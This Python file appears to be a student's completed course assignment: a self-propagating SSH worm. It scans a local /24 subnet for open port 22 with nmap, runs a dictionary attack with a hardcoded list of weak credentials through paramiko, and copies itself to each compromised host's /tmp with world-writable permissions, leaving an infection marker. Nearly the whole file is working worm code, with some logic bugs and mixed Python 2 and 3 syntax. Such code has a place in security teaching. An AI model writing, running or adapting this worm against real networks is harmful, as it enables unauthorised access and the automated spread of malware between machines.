import os
import sys
import socket
import paramiko
import nmap
import netinfo
import netifaces
import socket
import fcntl
import struct


# The list of credentials to attempt
credList = [
('root', 'toor'),
('admin', '#NetSec!#'),
('osboxes', 'osboxes.org'),
('cpsc', 'cpsc')
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	#returns true if file exists and false otherwise. 
	#i.e. check if the system is infected.  
	#thanks stackoverflow for telling me the difference between isfile and exists
	return os.path.exists(INFECTED_MARKER_FILE)
	#can also be done with an if else statement returning true if infected else false 

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	
	#from os import
	#os.mknod creates a filesystem node (file, device special file or named pipe) 
	#os.mknod(INFECTED_MARKER_FILE)
	#second attempt 
	#w for writing
	infectAttempt = open(INFECTED_MARKER_FILE, 'w') 
	#debugging
	infectAttempt.write("This is a stick up")
	infectAttempt.close()

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.	
	#pass

	#paramiko to open a sftp session on the SSH server 
	#assigned it to a variable to start the process
	client = sshClient.open_sftp();

	#client has a open sftp channel now 
	#put stuff in there now 
	#put worm.py in the /tmp folder 
	#client.put("worm.py", "/tmp/worm.py")
	#changing plans writing the file 

	fileInf = client.file(INFECTED_MARKER_FILE, 'w')
	fileInf.close()

	#put worm.py in said infected_marker path 
	client.put("worm.py", "/tmp/worm.py")

	#os stuff, i hate octals, no one told me the 0 was a thing :Ree:
	client.chmod("/tmp/worm.py", 0777) 

	#execute the command 
	#i couldn't implement the entire bee movie's script into the files i'm sad 
	#BEES 
	sshClient.exec_command("chmod a+x /tmp/worm.py")



############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     
	# Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
	#pass

	#try means try and have excepts to catch errors 

	#If nothing is wrong then we just go and return 0 

	try:
		print ("Attempting authentication")
		#going through the list of credentials
		#try connecting
		#connect takes 4 parameters, host, part, username, password, but we can ignore the port
		#following the handout 
		sshClient.connect(host, username=userName, password=password) 
		print("Authentication successful")
		return 0 #passed 
	except paramiko.SSHException:
		print("Authentication Failed, wrong crednetials")
		return 1 #failed 
	except socket.error: #yo this stuff is bumpin 
		print("Authentication Failed, Server down or not running SSH")
		return 3 #failed



###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	auth = None
				
	# Go through the credentials
	for (username, password) in credList:

		#call tryCredentials function 
		auth = tryCredentials(host, username, password, ssh)

		#local variable 
		#if result is successful
		if (auth == 0):
			print("infected the host: " + host)
			return ssh
		else: 
			print("Shouldn't get here but oh wells")
			return None
			
	# Could not find working credentials
	# return whatever we got from the attack (if results weren't successful, eff it, empty list then) 
	return None	

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP(interface):
	
	# TODO: Change this to retrieve and
	# return the IP of the current system.

	# TODO: learn netifaces 
	interface = netifaces.interfaces()

	#make the ip address = to none 
	ipAddr = None

	#Scour the addresses and return the address that isn't the loopback. 
	for netFaces in interface:
		addr = netifaces.ifaddresses(netFaces)[2][0]['addr']

		#we don't like loopbacks
		if not addr == "127.0.0.1":
			ipAddr = addr
			break

	return ipAddr

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.	
	

	#Scans for hosts on the same network 
	scanner = nmap.PortScanner()

	scanner.scan("10.0.0.0/24", arguments="-p 22 --open")

	hostInfo = scanner.all_hosts()

	discoveredAddresses = []

	for host in hostInfo:
		#if state is UP 
		if scanner[host].state() == "up":
			#append it
			discoveredAddresses.append(host)

	return discoveredAddresses

	





# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 
if len(sys.argv) < 2:
	
	# TODO: If we are running on the victim, check if 
	# the victim was already infected. If so, terminate.
	# Otherwise, proceed with malice. 
	if isInfectedSystem == "True":
		print("Already infected")
		sys.exit(0)
	
	#else:
	#	print "Infect process starting"
	#	markInfected()


# TODO: Get the IP of the current system
netInterface = netifaces.interfaces()

sourceIP = getMyIP(netInterface)

# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()

# TODO: Remove the IP of the current system
# from the list of discovered systems (we
# do not want to target ourselves!).

print("Removing IP address from current system")
networkHosts.remove(sourceIP)

print "Found hosts: ", networkHosts


# Go through the network hosts
for host in networkHosts:
	
	# Try to attack this host
	sshInfo =  attackSystem(host)
	
	# For simplicity and ease of reading 
	print("sshInfo:")
	print sshInfo
	

	# Did said attack succed or not 
	# replacing != with not as not just checked the memory source rather than whether the two variables are the same. 
	if sshInfo and not host == sourceIP:
		print("Execute order 66 (infection spreads)")
		spreadAndExecute(sshInfo)

		print("The order is complete")
			


